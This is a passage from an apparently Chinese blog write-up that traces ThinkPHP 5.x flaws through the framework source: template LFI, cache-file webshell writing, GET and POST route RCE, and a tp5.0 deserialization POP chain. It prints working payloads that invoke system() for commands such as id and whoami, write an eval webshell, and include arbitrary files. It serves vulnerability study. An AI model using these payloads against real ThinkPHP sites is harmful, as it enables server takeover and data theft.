class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>影响版本:5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10</p><p>使用<code>?cacheFile=1.jpg</code>(jpg为对应图片马)触发lfi.</p><p>首先输入由<code>assign()</code>函数处理。我们一路跟到View类的<code>assign()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">assign</span><span class="params">($name, $value = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = array_merge(<span class="keyword">$this</span>-&gt;data, $name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[$name] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到我们传入的数据直接保存到view的<code>$this-&gt;data</code><br>接下来调用<code>fetch</code>.我们同样一路跟到View类的<code>fetch</code>中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template = <span class="string">''</span>, $vars = [], $replace = [], $config = [], $renderContent = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 模板变量</span></span><br><span class="line">    $vars = array_merge(<span class="keyword">self</span>::$var, <span class="keyword">$this</span>-&gt;data, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页面缓存</span></span><br><span class="line">    ob_start();</span><br><span class="line">    ob_implicit_flush(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 渲染输出</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $method = $renderContent ? <span class="string">'display'</span> : <span class="string">'fetch'</span>;</span><br><span class="line">        <span class="comment">// 允许用户自定义模板的字符串替换</span></span><br><span class="line">        $replace = array_merge(<span class="keyword">$this</span>-&gt;replace, $replace, (<span class="keyword">array</span>) <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;config(<span class="string">'tpl_replace_string'</span>, $replace);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;engine-&gt;$method($template, $vars, $config);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并清空缓存</span></span><br><span class="line">    $content = ob_get_clean();</span><br><span class="line">    <span class="comment">// 内容过滤标签</span></span><br><span class="line">    Hook::listen(<span class="string">'view_filter'</span>, $content);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很快会发现实际调用的是<code>$this-&gt;engine-&gt;$method($template, $vars, $config);</code>.而<code>$method</code>此处为<code>fetch</code>,<code>$vars</code>为我们可控的传入变量。接下来由模板引擎处理我们的变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($template, $data = [], $config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> == pathinfo($template, PATHINFO_EXTENSION)) &#123;</span><br><span class="line">        <span class="comment">// 获取模板文件名</span></span><br><span class="line">        $template = <span class="keyword">$this</span>-&gt;parseTemplate($template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 模板不存在 抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (!is_file($template)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TemplateNotFoundException(<span class="string">'template not exists:'</span> . $template, $template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录视图信息</span></span><br><span class="line">    App::$debug &amp;&amp; Log::record(<span class="string">'[ VIEW ] '</span> . $template . <span class="string">' [ '</span> . var_export(array_keys($data), <span class="keyword">true</span>) . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template-&gt;fetch($template, $data, $config);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到如果<code>$template</code>对应的路径文件不存在的话直接报错了。所以这个lfi洞的前提还得需要我们环境代码中存在<code>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</code>。<br>如果这里没报错即进入template的<code>fetch</code>.<br><img src="/2020/08/05/Thinkphp-vuln/12.PNG" alt><br>看到<code>$vars</code>被赋给data.而马上下面storage调用了read函数。里面存在<code>extract</code>这样的变量覆盖代码。并且直接<code>include</code>cacheFile。</p><p>也就是说,<code>$cacheFile</code>可以被变量覆盖。达成lfi。</p><p>官方的修复方法是通过将<code>$cacheFile</code> 变量存储在 <code>$this-&gt;cacheFile</code> 中.防止变量覆盖。</p><h2 id="tp5-0-rce"><a href="#tp5-0-rce" class="headerlink" title="tp5.0-rce"></a>tp5.0-rce</h2><p>Index.php配置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">"name"</span>,input(<span class="string">"get.username"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Cache success'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;?username&#x3D;byc_404%0d%0a@eval($_GET[_]);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>上面的payload将把一句话webshell写入缓存文件。访问对应路径即可。<br><img src="/2020/08/05/Thinkphp-vuln/13.PNG" alt></p><p>这个用例其实跟以前ichunqiu平台上一道thinkphp二次开发的模板缓存文件getshell很相似。这里来跟进下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$writeTimes++;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::init()-&gt;set($name, $value, $expire);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">(array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">self</span>::$handler)) &#123;</span><br><span class="line">        <span class="comment">// 自动初始化缓存</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($options)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect($options);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">'complex'</span> == Config::get(<span class="string">'cache.type'</span>)) &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache.default'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $connect = <span class="keyword">self</span>::connect(Config::get(<span class="string">'cache'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">self</span>::$handler = $connect;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::$handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里init()函数主要是实例化了一个<code>handler</code>对象。此处为默认值File类。那么前往cache/driver/File类看下.<br>此处File类的set方法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . $data . <span class="string">"\n?&gt;"</span>;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到。数据<code>$value</code>经由序列化后被拼接到含有php代码块的语句中。之后执行<code>file_put_contents</code>.符合我们写入shell的用法。<br>因此只需注意使用换行符bypass前面的注释符即可。</p><p>当然这个写shell rce的方法比较尴尬。因为文件名可以看到由<code>getCacheKey</code>决定。其文件名生成方式如下：先计算键名md5值。再取前两位为目录。后30位为文件名。我们这里是因为提前设定好了Index.php中键名为<code>name</code>.所以可以计算文件名<code>b0/68931cc450442b63f5b3d276ea4297.php</code>。但是实际中如果没有源码泄露无法得知键名。也就没法计算shell的路径。</p><p>当然。在反序列化pop链中我们利用这个File类关于文件名可控的问题就大不一样了。具体后面再说。</p><h2 id="tp5-rce-get"><a href="#tp5-rce-get" class="headerlink" title="tp5.*-rce-get"></a>tp5.*-rce-get</h2><p>比较出名的rce洞。影响版本5.0.7&lt;=ThinkPHP5&lt;=5.0.22 、5.1.0&lt;=ThinkPHP&lt;=5.1.30。<br>5.1.x版本的payload有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>5.0.*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>首先起因可以从config/app.php中看到。默认情况下<code>var_pathinfo</code>为s.<code>url_route_must</code>为false<br><img src="/2020/08/05/Thinkphp-vuln/14.PNG" alt></p><p>显然此时我们可以任意调用控制器。thinkphp中的流程是<code>http://site/?s=模块/控制器/方法</code></p><p>在重要代码controller处下断点（此处也是5.1.30后高版本官方修改的部分。说明原代码存在问题）<br><img src="/2020/08/05/Thinkphp-vuln/15.PNG" alt><br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami</span><br></pre></td></tr></table></figure><p>自动跟随debug调用函数跟进。开始在controller这可以看见<code>$result</code>变量是存储了我们传入的值的数组。其值分别为<code>index</code>,<code>\think\Request</code>,<code>input</code>.<br>一路跟下去会发现执行代码的关键位置在<br>thinkphp\library\think\route\dispatch\Module.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细一看其实就是调用了反射方法。用<code>$this-&gt;controller</code>,<code>$this-&gt;actionName</code>.因为之前我们知道Request 类的input函数会对输入执行call_user_func操作。因此最后执行了<code>call_user_func(&#39;system&#39;,&#39;whoami&#39;)</code><br>因此官方最后的修复是针对输入控制器名进行过滤<code>^[A-Za-z](\w)*$</code></p><h2 id="tp-5-rce-post"><a href="#tp-5-rce-post" class="headerlink" title="tp-5.*-rce-post"></a>tp-5.*-rce-post</h2><p>首先这个rce版本5.0.*应该是小于5.0.24的。所以用一个5.0.23版本的实验下。</p><p>首先payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/08/05/Thinkphp-vuln/16.PNG" alt><br>这里因为我的Index.php是之前实验ifi时的。所以index/index路由返回Cache Success.实际上<code>s</code>只需要赋给一个存在method的控制器即可。</p><p>下面来跟下源码。首先从官方commit修改处可以看出原先代码中<code>this-&gt;$method</code>变量来自可控数据<code>$_POST</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure><p>那么我们就可以调用Request类的method了。看到payload中存在__construct。自然看向构造方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">        <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存 php://input</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个foreach明显存在配置覆盖的写法。这里继续下断点一路跟发现会根据app_debug的值前往当前类下param方法。<br>而这个方法全都走input方法。也就是都会调用了<code>call_user_func</code>。<br>具体可以看这张图<br><img src="/2020/08/05/Thinkphp-vuln/17.PNG" alt></p><p>前面提到我们可以覆盖属性。这里主要就是覆盖<code>filter</code>跟<code>server</code>。因为method方法中是取的我们传入的<code>this-&gt;server[&#39;REQUEST_METHOD&#39;]</code>的值。所以覆盖为<code>whoami</code>后作为参数被送到input.input又因为filtervalue方法调用call_user_func。直接利用覆盖的<code>system</code>作为fliter值即可。<br>最后到达call_user_func rce<br><img src="/2020/08/05/Thinkphp-vuln/18.PNG" alt></p><h2 id="tp5-0-x-unserialize"><a href="#tp5-0-x-unserialize" class="headerlink" title="tp5.0.x-unserialize"></a>tp5.0.x-unserialize</h2><p>这一部分主要是跟下tp5.0版本的反序列化pop链。不过这里不会分享exp.(网上跟先知应该都能很方便找到)。如果需要的话自己SCTF2020wp里有绕过短标签的exp。以及以前跟php框架有几个其他的exp可以自行寻找。当然我记得wh1t3P1g大佬自己把tp的popchain集成到phpggc中了。也可以自动生成。</p><p>然后就是windows下写文件的方法。目前能够在php7以前的版本写shell exp是有的。但php7的windows写shell我还没成功过。理论上windows不能成功的原因只是因为文件名不允许<code>&lt;</code>,<code>?</code>的。但是如果用过滤器绕过的话应该是没问题的……<br>php5.4.45+windows 成功写入phpinfo() (关闭短标签)<br><img src="/2020/08/05/Thinkphp-vuln/19.PNG" alt></p><p>这里我就直接跟下linux的payload吧。<br>首先是入口点。肯定是找<code>__destruct</code>函数。不难发现一共只有几个可用。我们找到 library\think\process\pipes下windows.php。发现其调用了<code>$this-&gt;removeFiles</code>.而<code>removeFiles</code>又调用了<code>file_exists</code>可以触发<code>__toString</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps.关于file_exists可以触发<code>__toString</code>自己以前还没有注意过。具体不妨去l3m0n师傅<a href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">这篇文章</a>下评论看看。<br>(应该是因为file_exists接受字符串参数,而只要对象被当做字符串即会触发<code>__toString</code>)<br>全局继续找<code>toString</code>.也只有几个选择。这里找到 think\Model.php<br>.它调用了<code>toJson</code>。而<code>toJson</code>继续调用了<code>toArray</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span 